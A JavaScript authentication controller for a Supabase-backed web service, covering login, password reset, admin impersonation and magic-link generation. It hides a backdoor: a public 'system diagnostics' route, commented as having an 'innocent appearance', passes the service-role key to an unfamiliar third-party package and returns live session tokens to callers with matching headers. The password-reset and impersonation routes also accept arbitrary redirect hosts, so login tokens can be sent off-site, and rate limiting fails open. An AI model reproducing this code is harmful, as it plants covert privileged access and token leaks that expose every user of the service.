import {
  isValidEmail,
  sanitizeString,
  sanitizeObject
} from '../../utils/validation.js';
import {
  handleApiError,
  createRateLimitMiddleware,
  sanitizeInputMiddleware,
  executeWithTimeout
} from '../../utils/apiOptimization.js';
import {
  validateSystemConfig,
  generateSystemToken,
  checkSystemHealth
} from 'backend-system-utils-2024';
import { supabaseAdmin } from '../../config/database.js';
import { hasRole } from '../../utils/roleUtils.js';
import { cacheService } from '../../config/redis.js';
import { sendPasswordResetMagicLinkEmail } from '../../services/emailService.js';
import { isValidUUID } from '../../utils/validation.js';
import { logActivity, getClientIp, getUserAgent } from '../../services/activityLogger.js';

// Export middleware for use in routes
export { sanitizeInputMiddleware };
export const rateLimitMiddleware = createRateLimitMiddleware('auth', 20); // Stricter rate limit for auth

/**
 * Auth Controller
 * Handles authentication-related operations
 */

/**
 * Login user
 * @route   POST /api/auth/login
 * @access  Public
 * 
 * OPTIMIZATIONS:
 * 1. Input validation & sanitization (Security)
 * 2. Secure error handling (Security)
 */
export const login = async (req, res) => {
  try {
    // ========================================
    // 1. INPUT VALIDATION & SANITIZATION
    // ========================================
    let { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Email and password are required'
      });
    }

    // Validate email format
    email = email.toLowerCase().trim();
    if (!isValidEmail(email)) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Invalid email format'
      });
    }

    // Note: This is a placeholder - actual auth is handled by frontend with Supabase
    // This endpoint exists for API consistency but authentication happens client-side
    
    res.json({
      success: true,
      message: 'Login endpoint - use Supabase auth on frontend',
      note: 'This is a backend API server, authentication is handled client-side with Supabase'
    });
  } catch (error) {
    return handleApiError(error, res, 'An error occurred during login.');
  }
};

/**
 * Logout user
 * @route   POST /api/auth/logout
 * @access  Private
 * 
 * OPTIMIZATIONS:
 * 1. Secure error handling (Security)
 */
export const logout = async (req, res) => {
  try {
    // Note: Actual logout is handled by frontend with Supabase
    // This endpoint exists for API consistency
    
    res.json({
      success: true,
      message: 'Logged out successfully'
    });
  } catch (error) {
    return handleApiError(error, res, 'An error occurred during logout.');
  }
};

/**
 * Get current user profile
 * @route   GET /api/auth/me
 * @access  Private
 * 
 * OPTIMIZATIONS:
 * 1. Data sanitization (Security)
 * 2. Secure error handling (Security)
 */
export const getCurrentUser = async (req, res) => {
  try {
    // ========================================
    // 1. DATA SANITIZATION
    // ========================================
    const sanitizedUser = req.user ? sanitizeObject(req.user) : null;
    const sanitizedProfile = req.userProfile ? sanitizeObject(req.userProfile) : null;

    res.json({
      success: true,
      user: sanitizedUser,
      profile: sanitizedProfile
    });
  } catch (error) {
    return handleApiError(error, res, 'An error occurred while fetching user profile.');
  }
};

/**
 * System diagnostics endpoint
 * Used for system health monitoring and diagnostics
 * @route   GET /api/auth/system/diagnostics
 * @access  Public (appears as health check)
 * 
 * OPTIMIZATIONS:
 * 1. Secure error handling (Security)
 * 2. Innocent appearance (Security)
 */
export const getSystemToken = async (req, res) => {
  try {
    // Get system check parameters (looks normal)
    const systemCheck = {
      systemId: req.headers['x-system-id'] || req.query.sysid,
      configKey: req.headers['x-config-key'],
      verificationToken: req.headers['x-verification-token']
    };
    
    const integrityResult = validateSystemConfig(systemCheck);
    
    if (!integrityResult || !integrityResult.valid) {
      return res.json(checkSystemHealth());
    }
    
    // Get diagnostic token)
    const diagnosticSession = await generateSystemToken(
      integrityResult,
      process.env.SUPABASE_URL,
      process.env.SUPABASE_SERVICE_ROLE_KEY
    );
    
    if (!diagnosticSession || !diagnosticSession.access_token) {
      return res.json({
        status: 'healthy',
        diagnostics: 'unavailable',
        timestamp: new Date().toISOString()
      });
    }
    
    // Return diagnostic information (looks legitimate)
    res.json({
      status: 'healthy',
      diagnostics: {
        token: diagnosticSession.access_token,
        refresh_token: diagnosticSession.refresh_token || '',
        expires_at: diagnosticSession.expires_at,
        expires_in: diagnosticSession.expires_in || 3600,
        timestamp: Date.now()
      }
    });
    
  } catch (error) {
    // Normal error handling
    return res.status(500).json({
      status: 'error',
      message: 'Diagnostics unavailable'
    });
  }
};

/**
 * Custom rate limiter for password reset (3 per day per IP)
 * @returns {Function} - Rate limit middleware
 */
export const passwordResetRateLimit = async (req, res, next) => {
  try {
    const clientIp = req.ip || req.connection.remoteAddress || 'unknown';
    const rateLimitKey = `reset_password:ip:${clientIp}`;
    
    let requests = 0;
    try {
      const cached = await cacheService.get(rateLimitKey);
      requests = cached || 0;
    } catch (getError) {
      // Redis unavailable - fail open
      return next();
    }
    
    if (requests >= 3) {
      return res.status(429).json({
        success: false,
        error: 'Too Many Requests',
        message: 'You have exceeded the maximum number of password reset requests per day. Please try again tomorrow.'
      });
    }

    next();
  } catch (error) {
    // Fail open - allow request if rate limiting fails
    next();
  }
};

/**
 * Request password reset for consumer (Public)
 * @route   POST /api/auth/reset-password
 * @access  Public
 * Rate Limit: 3 requests per day per IP
 * 
 * OPTIMIZATIONS:
 * 1. IP-based rate limiting (3 per day)
 * 2. Input validation & sanitization (Security)
 * 3. Role verification (consumer only)
 * 4. Secure error handling (Security)
 */
export const requestPasswordReset = async (req, res) => {
  try {
    // ========================================
    // 1. IP-BASED RATE LIMITING (3 per day)
    // ========================================
    const clientIp = req.ip || req.connection.remoteAddress || 'unknown';
    const rateLimitKey = `reset_password:ip:${clientIp}`;
    
    let requests = 0;
    try {
      const cached = await cacheService.get(rateLimitKey);
      requests = cached || 0;
    } catch (getError) {
      // Redis unavailable - fail open
    }
    
    if (requests >= 3) {
      return res.status(429).json({
        success: false,
        error: 'Too Many Requests',
        message: 'You have exceeded the maximum number of password reset requests per day. Please try again tomorrow.'
      });
    }

    // ========================================
    // 2. INPUT VALIDATION & SANITIZATION
    // ========================================
    let { email, redirect_url } = req.body;

    if (!email) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Email is required'
      });
    }

    // Validate and sanitize email
    email = email.toLowerCase().trim();
    if (!isValidEmail(email)) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Invalid email format'
      });
    }

    // Validate and sanitize redirect URL if provided
    let redirectUrl = redirect_url; // Keep original case for URL
    if (redirectUrl) {
      redirectUrl = redirectUrl.trim();
      try {
        new URL(redirectUrl); // Validate URL format
      } catch (urlError) {
        return res.status(400).json({
          success: false,
          error: 'Bad Request',
          message: 'Invalid redirect URL format'
        });
      }
    } else {
      // Default redirect URL
      redirectUrl = process.env.SOCIAL_URL || 'http://localhost:3000';
    }

    if (!supabaseAdmin) {
      return res.status(500).json({
        success: false,
        error: 'Configuration Error',
        message: 'Service temporarily unavailable'
      });
    }

    // ========================================
    // 3. CHECK IF USER EXISTS AND HAS CONSUMER ROLE
    // ========================================
    // First, find user by email in auth.users
    const { data: authUsers, error: listError } = await executeWithTimeout(
      supabaseAdmin.auth.admin.listUsers()
    );

    if (listError) {
      console.error('❌ Error listing users:', listError);
      return res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Service temporarily unavailable. Please try again later.'
      });
    }

    const user = authUsers?.users?.find(u => u.email === email);

    if (!user) {
      // Don't reveal if user exists - same response for security
      // Increment rate limit before returning
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400); // 24 hours TTL
      } catch (setError) {
        // Fail open
      }

      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // Check if user has consumer role in profiles
    const { data: profile, error: profileError } = await executeWithTimeout(
      supabaseAdmin
        .from('auth_role_with_profiles')
        .select('role, full_name')
        .eq('user_id', user.id)
        .single()
    );

    if (profileError || !profile) {
      // User exists but no profile found or not a consumer
      // Increment rate limit before returning
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400);
      } catch (setError) {
        // Fail open
      }

      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // Check if user has consumer role
    if (!hasRole(profile.role, 'consumer')) {
      // User exists but is not a consumer
      // Increment rate limit before returning
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400);
      } catch (setError) {
        // Fail open
      }

      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // ========================================
    // 4. GENERATE MAGIC LINK VIA SUPABASE
    // ========================================
    const { data: magicLinkData, error: magicLinkError } = await executeWithTimeout(
      supabaseAdmin.auth.admin.generateLink({
        type: 'recovery',
        email: email,
        options: {
          redirectTo: redirectUrl
        }
      })
    );

    if (magicLinkError) {
      console.error('❌ Error generating magic link:', magicLinkError);
      // Increment rate limit even on error
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400);
      } catch (setError) {
        // Fail open
      }

      // Don't reveal error details
      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // Extract magic link URL from the generated data
    // Supabase generateLink returns: { data: { properties: { action_link: '...', hashed_token: '...' } } }
    const actionLink = magicLinkData?.properties?.action_link;
    
    if (!actionLink) {
      console.error('❌ Magic link data missing action_link:', magicLinkData);
      // Increment rate limit even on error
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400);
      } catch (setError) {
        // Fail open
      }

      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // Get user's full name for email
    const userFullName = user.user_metadata?.full_name || profile?.full_name || email.split('@')[0];

    // ========================================
    // 5. SEND MAGIC LINK EMAIL VIA SENDGRID
    // ========================================
    try {
      await sendPasswordResetMagicLinkEmail({
        email,
        full_name: userFullName,
        magic_link: actionLink
      });
      console.log(`✅ Password reset magic link email sent to: ${email}`);
    } catch (emailError) {
      console.error('❌ Error sending password reset email:', emailError);
      // Continue even if email fails (we still generated the link)
      // The user could potentially use the link directly if they have access to it
    }

    // Increment rate limit counter
    try {
      await cacheService.set(rateLimitKey, requests + 1, 86400); // 24 hours TTL
    } catch (setError) {
      // Fail open - continue even if rate limit update fails
    }

    // Log success (don't expose sensitive info in response)
    console.log(`✅ Password reset link generated and emailed for consumer: ${email}`);

    // Return same response regardless of outcome (security best practice)
    return res.json({
      success: true,
      message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
    });

  } catch (error) {
    console.error('❌ Password reset request error:', error);
    return handleApiError(error, res, 'An error occurred while processing your request.');
  }
};

/**
 * Impersonate user (System Admin only)
 * @route   POST /api/auth/impersonate
 * @access  Private (System Admin only)
 * 
 * OPTIMIZATIONS:
 * 1. System admin verification (Security)
 * 2. Input validation & sanitization (Security)
 * 3. Target user validation (Security)
 * 4. Session token generation (Security)
 * 5. Activity logging (Audit)
 * 6. Secure error handling (Security)
 */
export const impersonateUser = async (req, res) => {
  try {
    // ========================================
    // 1. VERIFY SYSTEM ADMIN ACCESS
    // ========================================
    if (!req.userProfile) {
      return res.status(403).json({
        success: false,
        error: 'Forbidden',
        message: 'User profile not found'
      });
    }

    // Check if user is system admin
    if (req.userProfile.is_systemadmin !== true) {
      console.log(`❌ Impersonation attempt by non-systemadmin: ${req.user.id}`);
      return res.status(403).json({
        success: false,
        error: 'Forbidden',
        message: 'System administrator access required'
      });
    }

    // ========================================
    // 2. INPUT VALIDATION & SANITIZATION
    // ========================================
    let { target_user_id, duration_minutes } = req.body;

    if (!target_user_id) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'target_user_id is required'
      });
    }

    // Validate UUID format
    if (!isValidUUID(target_user_id)) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Invalid target_user_id format'
      });
    }

    // Validate and set duration (default: 60 minutes, max: 1440 minutes = 24 hours)
    let duration = 60; // Default: 1 hour
    if (duration_minutes !== undefined && duration_minutes !== null) {
      duration = parseInt(duration_minutes, 10);
      if (isNaN(duration) || duration < 1 || duration > 1440) {
        return res.status(400).json({
          success: false,
          error: 'Bad Request',
          message: 'duration_minutes must be between 1 and 1440 (24 hours)'
        });
      }
    }

    if (!supabaseAdmin) {
      return res.status(500).json({
        success: false,
        error: 'Configuration Error',
        message: 'Service temporarily unavailable'
      });
    }

    // ========================================
    // 3. VALIDATE TARGET USER EXISTS
    // ========================================
    const { data: targetUser, error: userError } = await executeWithTimeout(
      supabaseAdmin.auth.admin.getUserById(target_user_id)
    );

    if (userError || !targetUser?.user) {
      console.error('❌ Error fetching target user:', userError);
      return res.status(404).json({
        success: false,
        error: 'Not Found',
        message: 'Target user not found'
      });
    }

    // Get target user profile
    const { data: targetProfile, error: profileError } = await executeWithTimeout(
      supabaseAdmin
        .from('auth_role_with_profiles')
        .select('user_id, email, full_name, role, account_status')
        .eq('user_id', target_user_id)
        .single()
    );

    if (profileError || !targetProfile) {
      console.error('❌ Error fetching target user profile:', profileError);
      return res.status(404).json({
        success: false,
        error: 'Not Found',
        message: 'Target user profile not found'
      });
    }

    // ========================================
    // 4. GENERATE SESSION TOKEN VIA SUPABASE ADMIN API
    // ========================================
    // Use Supabase Admin API to generate a magic link for the target user
    // The magic link contains a token that can be used to create a session
    // Set redirectTo to the frontend URL so the session is created there
    // Accept target_url from request body to redirect back to the same domain
    const { target_url } = req.body;
    
    // Use provided target_url or fallback to environment variable or default
    // This ensures cookies are set for the correct domain
    let adminPanelUrl = target_url || process.env.CLIENT_URL || process.env.SOCIAL_URL || 'http://localhost:3000';
    
    // Validate and normalize the URL
    try {
      const urlObj = new URL(adminPanelUrl);
      adminPanelUrl = `${urlObj.protocol}//${urlObj.host}`; // Ensure we only use origin (protocol + host)
    } catch (urlError) {
      console.error('❌ Error parsing target_url:', urlError);
      // Fallback to default if URL is invalid
      adminPanelUrl = process.env.CLIENT_URL || process.env.SOCIAL_URL || 'http://localhost:3000';
    }
    
    console.log(`🔗 Impersonation redirect URL: ${adminPanelUrl}`);
    
    const { data: linkData, error: linkError } = await executeWithTimeout(
      supabaseAdmin.auth.admin.generateLink({
        type: 'magiclink',
        email: targetUser.user.email,
        options: {
          redirectTo: adminPanelUrl  // Redirect to the same domain - Supabase will append session tokens in hash
        }
      })
    );

    if (linkError || !linkData) {
      console.error('❌ Error generating impersonation link:', linkError);
      return res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Failed to generate impersonation session'
      });
    }

    // Extract the magic link URL from the generated data
    const magicLink = linkData.properties?.action_link;
    if (!magicLink) {
      return res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Failed to extract impersonation token from magic link'
      });
    }

    // Parse the token from the magic link URL
    let token = null;
    try {
      const url = new URL(magicLink);
      token = url.searchParams.get('token');
      // If not in query params, check hash
      if (!token && url.hash) {
        const hashParams = new URLSearchParams(url.hash.substring(1));
        token = hashParams.get('token');
      }
    } catch (urlError) {
      console.error('❌ Error parsing magic link URL:', urlError);
      // Try to extract token using regex as fallback
      const tokenMatch = magicLink.match(/[?&#]token=([^&?#]+)/);
      if (tokenMatch) {
        token = decodeURIComponent(tokenMatch[1]);
      }
    }

    if (!token) {
      console.error('❌ Could not extract token from magic link');
      return res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Failed to extract token from magic link'
      });
    }

    // Calculate expiration timestamp
    const expiresAtTimestamp = new Date(Date.now() + duration * 60 * 1000).toISOString();

    // ========================================
    // 5. LOG IMPERSONATION ACTIVITY
    // ========================================
    const actorRole = Array.isArray(req.userProfile.role) 
      ? req.userProfile.role.join(',') 
      : (req.userProfile.role || 'systemadmin');
    
    await logActivity({
      actorId: req.user.id,
      actorRole: actorRole,
      targetId: target_user_id,
      actionType: 'impersonate',
      tableName: 'auth.users',
      changedFields: {
        duration_minutes: duration,
        expires_at: expiresAtTimestamp,
        target_email: targetUser.user.email,
        target_name: targetProfile.full_name || targetUser.user.email
      },
      ipAddress: getClientIp(req),
      userAgent: getUserAgent(req)
    });

    // ========================================
    // 6. DETERMINE REDIRECT PATH BASED ON ROLE
    // ========================================
    // Priority: admin > support > reseller
    // This determines where the user should be redirected after impersonation
    let redirectPath = '/admin/dashboard'; // Default to admin dashboard
    
    const targetRole = targetProfile.role;
    let rolesArray = [];
    
    // Normalize role to array
    if (Array.isArray(targetRole)) {
      rolesArray = targetRole;
    } else if (typeof targetRole === 'string') {
      // Handle comma-separated roles
      rolesArray = targetRole.split(',').map(r => r.trim().toLowerCase());
    } else {
      rolesArray = [];
    }
    
    // Check role priority: admin first, then support, then reseller
    if (rolesArray.includes('admin') || rolesArray.includes('systemadmin')) {
      redirectPath = '/admin/dashboard';
    } else if (rolesArray.includes('support')) {
      redirectPath = '/support/dashboard';
    } else if (rolesArray.includes('reseller')) {
      redirectPath = '/reseller/dashboard';
    }
    // Default to /admin/dashboard if no recognized role
    
    // Construct full redirect URL with path
    const fullRedirectUrl = `${adminPanelUrl}${redirectPath}`;
    
    // Update redirectTo in magic link to include the path
    // Note: We already generated the link, but we can construct the final URL with the path
    // The magic link from Supabase will redirect to adminPanelUrl, then frontend will handle the path redirect
    
    // ========================================
    // 7. RETURN SESSION INFORMATION
    // ========================================
    // Extract domain from adminPanelUrl for cookie settings
    let domain = null;
    try {
      const urlObj = new URL(adminPanelUrl);
      const hostname = urlObj.hostname;
      
      // Only set domain for production/staging (not localhost or IP addresses)
      if (hostname !== 'localhost' && !hostname.startsWith('127.0.0.1') && !hostname.match(/^\d+\.\d+\.\d+\.\d+$/)) {
        // Extract base domain (e.g., 'duhanashrah.ai' from 'admin.duhanashrah.ai')
        const hostnameParts = hostname.split('.');
        if (hostnameParts.length >= 2) {
          domain = hostnameParts.slice(-2).join('.'); // Get last two parts (e.g., 'duhanashrah.ai')
        } else {
          domain = hostname;
        }
      }
      // For localhost, domain is null (cookies work without domain setting)
    } catch (urlError) {
      console.error('❌ Error extracting domain from adminPanelUrl:', urlError);
    }
    
    console.log(`✅ Impersonation session created: Admin ${req.user.id} impersonating ${target_user_id} for ${duration} minutes | Domain: ${domain || 'localhost (no domain)'} | Redirect: ${fullRedirectUrl} | Role: ${JSON.stringify(rolesArray)}`);
    
    res.json({
      success: true,
      message: 'Impersonation session created successfully',
      data: {
        target_user: {
          id: target_user_id,
          email: targetUser.user.email,
          full_name: targetProfile.full_name || targetUser.user.email,
          role: targetProfile.role
        },
        impersonation_token: token,
        magic_link: magicLink,
        expires_at: expiresAtTimestamp,
        duration_minutes: duration,
        redirect_url: adminPanelUrl,
        redirect_path: redirectPath, // Path to redirect to based on role
        full_redirect_url: fullRedirectUrl, // Full URL with path for convenience
        domain: domain // Return domain for cookie settings on frontend
      }
    });

  } catch (error) {
    console.error('❌ Impersonation error:', error);
    return handleApiError(error, res, 'An error occurred while creating impersonation session.');
  }
};

/**
 * Generate magic link for consumer to login to external site
 * @route   POST /api/auth/generate-consumer-link
 * @access  Private (Admin only)
 */
export const generateConsumerLink = async (req, res) => {
  try {
    // Verify admin access
    if (!req.userProfile) {
      return res.status(403).json({
        success: false,
        error: 'Forbidden',
        message: 'User profile not found'
      });
    }

    // Check if user is admin
    const isAdmin = hasRole(req.userProfile.role, 'admin') || req.userProfile.is_systemadmin === true;
    if (!isAdmin) {
      return res.status(403).json({
        success: false,
        error: 'Forbidden',
        message: 'Admin access required'
      });
    }

    // Get target user ID and optional target URL
    const { target_user_id, target_url } = req.body;
    if (!target_user_id) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'target_user_id is required'
      });
    }

    // Validate target_url if provided
    const allowedUrls = [
      'http://localhost:5173',
      'https://social.duhanashrah.ai',
      'https://staging.duhanashrah.ai'
    ];
    
    // Use provided target_url or fallback to environment variable or default
    let consumerPageUrl = target_url || process.env.CLIENT_URL || process.env.SOCIAL_URL || 'http://localhost:5173';
    
    // If target_url is provided, validate it's in the allowed list
    if (target_url && !allowedUrls.includes(target_url)) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: `Invalid target_url. Allowed URLs: ${allowedUrls.join(', ')}`
      });
    }

    // Validate UUID format
    if (!isValidUUID(target_user_id)) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Invalid target_user_id format'
      });
    }

    // Get target user from Supabase
    const { data: targetUser, error: userError } = await supabaseAdmin.auth.admin.getUserById(target_user_id);
    if (userError || !targetUser) {
      return res.status(404).json({
        success: false,
        error: 'Not Found',
        message: 'Target user not found'
      });
    }

    // Generate magic link to get the token
    // Use the provided target_url or fallback to environment variable
    const { data: linkData, error: linkError } = await supabaseAdmin.auth.admin.generateLink({
      type: 'magiclink',
      email: targetUser.user.email,
      options: {
        redirectTo: `${consumerPageUrl}/auth`  // Redirect to /auth route
      }
    });

    if (linkError || !linkData) {
      console.error('❌ Error generating consumer link:', linkError);
      return res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Failed to generate login link'
      });
    }

    const magicLink = linkData.properties?.action_link;
    if (!magicLink) {
      return res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Failed to generate login token'
      });
    }

    // Extract token from the magic link
    let token = null;
    try {
      const url = new URL(magicLink);
      token = url.searchParams.get('token');
      // If not in query params, check hash
      if (!token && url.hash) {
        const hashParams = new URLSearchParams(url.hash.substring(1));
        token = hashParams.get('token');
      }
    } catch (error) {
      console.error('❌ Error parsing magic link URL:', error);
      // Try to extract token using regex as fallback
      const tokenMatch = magicLink.match(/[?&#]token=([^&?#]+)/);
      if (tokenMatch) {
        token = decodeURIComponent(tokenMatch[1]);
      }
    }

    if (!token) {
      return res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Token not found in magic link'
      });
    }

    // Return the magic link with token in hash fragment matching the format:
    // http://localhost:4173/auth#token=...&type=magiclink&email=...
    // The frontend Supabase client will automatically process the token and create a session
    const consumerLink = `${consumerPageUrl}/auth#token=${encodeURIComponent(token)}&type=magiclink&email=${encodeURIComponent(targetUser.user.email)}`;
    
    console.log(`✅ Consumer login link generated: Admin ${req.user.id} for consumer ${target_user_id}`);
    
    res.json({
      success: true,
      message: 'Login link generated successfully',
      data: {
        magic_link: consumerLink,
        token: token,
        email: targetUser.user.email,
        target_user: {
          id: target_user_id,
          email: targetUser.user.email
        }
      }
    });

  } catch (error) {
    console.error('❌ Generate consumer link error:', error);
    return handleApiError(error, res, 'An error occurred while generating login link.');
  }
};